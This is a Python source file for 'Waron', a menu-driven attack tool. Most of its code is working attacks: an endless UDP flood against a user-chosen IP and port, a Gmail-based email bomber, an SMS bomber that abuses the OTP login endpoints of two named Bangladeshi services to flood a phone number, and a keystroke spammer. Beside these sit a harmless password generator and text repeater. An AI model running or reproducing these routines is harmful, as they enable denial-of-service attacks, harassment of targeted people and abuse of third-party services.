import socket
import sys
import os
import random
import string
import pyautogui
import smtplib
import requests
from time import sleep
from getpass import getpass

#Banner Area
banner = ''' 
\033[0;32m
            ▄▄██████████▄▄
        ▄████████████████████▄
      ▄█████████████████████████
    ▄█████████████████████████████
   ████████████▀  ▄▄▄ ▀████████████
  ████████████   ████▌  ████████████     Author   : Md. Ridwanul Islam Muntakim
  █████▄    █   ██████   █    ▄█████▌    Tool Name: Waron
 ████████   ▌   █▀  ▀█   █   ████████    Version  : 0.04
 █████████  ▌   ▌ ██▄       █████████    Learn | Hack | Secure
 ██████████▄█   ██████     ██████████    
 ▐███████████▌  ██████  ▄▄██████████
   ████████████  ▀███  ▄███████████▀
    █████████████▄▄▄▄█████████████▀
     ▀██████████████████████████▀
       ▀██████████████████████▀
          ▀▀██████████████▀▀
'''
print(banner)

#User Details
waronusername = ("waron -- user")
waronpassword = ("waron -- password")
username = input("Enter Username: \nuser@waron:~# ")
password = getpass("Enter Password: \nuser@waron:~# ")

#Functions
def runsupportbot():
    usage = ("DDOS Example: \n------------- \nTarget IP Address: 127.0.0.1 \nTarget Port Number: 80 \n \nBombing Example: \n---------------- \nBombing Numbers: 500 \nBombing Text: Waron is here \n \nEmail Bombing Example: \n---------------------- \nYour Gmail Address: name@gmail.com \nYour Gmail Address Password: Hello Password \nTarget Email Address: name@anything.com \nAttcker Message: Waron is here \nNumber Of Emails: 100 \n \nText Repeat Example: \n-------------------- \nRepeat Numbers: 100 \nRepeat Text: Waron is here \n \nStrong Password Generate Example: \n---------------------------------\nPassword Lenght: 100 \n \nBangladeshi Number Bombing Example: \n-----------------------------------\nEnter Target Number: 01700000000 \nNumber Of SMS: 1000")
    print(usage)
    sys.exit()

def warontoolsname():
    print("[i] Select Tool:")
    print("-"*16)
    tools = ["[1] DDOS Attack", "[2] GUI Bombing", "[3] Email Bombing", "[4] Bangladeshi Number Bombing", "[5] Text Repeat", "[6] Strong Password Generate"]
    index = 0
    lenght = 6
    while index < lenght:
        print(tools[index])
        index = index + 1

def runwaronddos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    targetipaddress = input("Enter Target IP Address: \nuser@waron:~# ")
    targetportnumber = int(input("Enter Target Port Number: \nuser@waron:~# "))
    trafficsent = 0
    while True:        
        sock.sendto(bytes, (targetipaddress,targetportnumber))
        trafficsent = trafficsent + 1
        print(f"Successfully {trafficsent} harm traffics sent to {targetipaddress}")
        if targetportnumber == 65534:            
            targetportnumber = 1

def runwaronguibombing():
    bomb = 1
    numberofbomb = int(input("Number Of Bomb: \nuser@waron:~# "))
    bombtext = input("Enter Bomb Text: \nuser@waron:~# ")
    sleep(3)
    while bomb <= numberofbomb:
        pyautogui.typewrite(bombtext)
        pyautogui.typewrite("\n")
        bomb = bomb + 1
    print("[i] Attack Complete")

def runwaronemailbombing():
    attackeremailaddress = input("Enter Your Gmail Address: \nuser@waron:~# ")
    attackerpassword = getpass("Enter Your Gmail Address Password: \nuser@waron:~# ")
    targetemailaddress = input("Enter Target Email Address: \nuser@waron:~# ")
    attackermessage = input("Attacker Message: \nuser@waron:~# ")
    numberofemails = int(input("Number Of Emails: \nuser@waron:~# "))
    emailserver = smtplib.SMTP("smtp.gmail.com",587)
    emailserver.starttls()
    emailserver.login(attackeremailaddress,attackerpassword)
    sentemail = 1
    while sentemail <= numberofemails:
        emailserver.sendmail(attackeremailaddress,targetemailaddress,attackermessage)
        print(f"Successfully {sentemail} email sent to {targetemailaddress}")
        sentemail = sentemail + 1
    emailserver.quit()

def runwaronbangladeshinumberbombing():
    targetnumber = input("Enter Target Number: \nuser@waron:~# ")
    numberofsms = int(input("Number Of SMS: \nuser@waron:~# "))
    sentsms = 1
    if len(targetnumber) == 11:
            while sentsms <= numberofsms:
                try:
                    if "014" in targetnumber or "019" in targetnumber:
                        r = requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":targetnumber})
                    else:
                        url="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+targetnumber+"&operator=bd-otp"
                        r = requests.get(url)
                        print(f"Successfully {sentsms} SMS sent to {targetnumber}")
                        sentsms = sentsms + 1
                except:
                    print("Sorry, no SMS was sent")
    else:
        print("\033[0;31m[x] The number you entered is incorrect\033[0;32m")

def runwarontextrepeat():
    textcount = 1
    numberoftext = int(input("Number Of Text: \nuser@waron:~# "))
    text = input("Enter Text: \nuser@waron:~# ")
    while textcount <= numberoftext:
        print(text)
        textcount = textcount + 1

def runwaronpasswordgenerate():
    passwordlenght = int(input("Enter Password Lenght: \nuser@waron:~# "))
    adduppercase = string.ascii_uppercase
    addlowercase = string.ascii_lowercase
    adddigits = string.digits
    addpunctuation = string.punctuation
    adduppercaseandlowercase = adduppercase + addlowercase
    uppercaseandlowercaselist = []
    for upperandlower in adduppercaseandlowercase:
        uppercaseandlowercaselist.append(upperandlower)
    random.shuffle(uppercaseandlowercaselist)
    uppercaseandlowercasejoined = "".join(uppercaseandlowercaselist[:500])
    digitslist = []
    for digits in adddigits:
        digitslist.append(digits)
    random.shuffle(digitslist)
    digitsjoined = "".join(digitslist[:500])
    punctuationlist = []
    for punctuation in addpunctuation:
        punctuationlist.append(punctuation)
    random.shuffle(punctuationlist)
    punctuationjoined = "".join(punctuationlist[:500])
    addall = uppercaseandlowercasejoined + digitsjoined + punctuationjoined
    passwordlist = []
    for passwords in addall:
        passwordlist.append(passwords)
    random.shuffle(passwordlist)
    passwordsjoined = "".join(passwordlist[:passwordlenght])
    print(f"Your Password: {passwordsjoined}") 

#Control Details
if waronusername == username and waronpassword == password:
    print("Login Successfully")
    sleep(3)
    os.system("clear")
    print(banner)
    actionsupportbot = input("Need Usage Details: \nuser@waron:~# ")
    if actionsupportbot == "yes":
        runsupportbot() 
    elif actionsupportbot == "no":
        warontoolsname()
        selectiontool = int(input("user@waron:~# "))
        if selectiontool == 1:
            runwaronddos()
        elif selectiontool == 2:
            runwaronguibombing()
        elif selectiontool == 3:
            runwaronemailbombing()
        elif selectiontool == 4:
            runwaronbangladeshinumberbombing()
        elif selectiontool == 5:
            runwarontextrepeat()
        elif selectiontool == 6:
            runwaronpasswordgenerate()   
        else:
            print("\033[0;31m[x] Wrong Tool Selection\033[0;32m")
    else:
        print("\033[0;31m[x] Wrong Command\033[0;32m")
        sys.exit()
else:
    print("\033[0;31m[x] Wrong Login Information\033[0;32m")
    sys.exit()